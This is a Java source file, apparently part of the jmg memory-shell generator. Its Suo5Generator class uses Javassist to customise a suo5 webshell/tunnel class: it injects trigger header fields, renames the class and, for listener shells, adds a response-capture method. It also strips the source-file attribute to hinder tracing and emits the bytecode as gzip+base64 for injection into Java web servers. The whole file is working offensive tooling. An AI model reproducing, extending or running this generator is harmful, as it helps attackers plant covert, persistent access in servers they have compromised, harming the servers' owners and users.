package jmg.suo5.generator;

import javassist.ClassClassPath;
import javassist.CtClass;
import jmg.core.config.AbstractConfig;
import jmg.core.config.Constants;
import jmg.core.generator.IShellGenerator;
import jmg.suo5.util.ShellUtil;
import jmg.core.util.CommonUtil;
import jmg.core.util.JavassistUtil;
import jmg.core.util.ResponseUtil;
import me.gv7.woodpecker.tools.common.FileUtil;

public class Suo5Generator implements IShellGenerator {


    @Override
    public void initShell(AbstractConfig config) {

    }

    @Override
    public byte[] makeShell(AbstractConfig config) throws Exception {
        initShell(config);
        String shellName = ShellUtil.getShellName(config.getToolType(), config.getShellType());
        String shellClassName = ShellUtil.getShellClassName(shellName);
        byte[] bytes = modifyShell(shellClassName, config);
        config.setShellBytes(bytes);
        config.setShellBytesLength(bytes.length);
        config.setShellGzipBase64String(CommonUtil.encodeBase64(CommonUtil.gzipCompress(bytes)));
        return bytes;
    }

    @Override
    public byte[] modifyShell(String className, AbstractConfig config) {
        byte[] bytes = new byte[0];
        try {
            pool.insertClassPath(new ClassClassPath(Suo5Generator.class));
            CtClass ctClass = pool.getCtClass(className);
            ctClass.getClassFile().setVersionToJava5();
            JavassistUtil.addFieldIfNotNull(ctClass, "headerName", config.getHeaderName());
            JavassistUtil.addFieldIfNotNull(ctClass, "headerValue", config.getHeaderValue());
            JavassistUtil.setNameIfNotNull(ctClass, config.getShellClassName());

            if (config.getShellType().equals(Constants.SHELL_LISTENER)) {
                String methodBody = ResponseUtil.getMethodBody(config.getServerType());
                JavassistUtil.addMethod(ctClass, "getResponseFromRequest", methodBody);
            }
            JavassistUtil.removeSourceFileAttribute(ctClass);
            bytes = ctClass.toBytecode();
            ctClass.detach();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return bytes;
    }

}
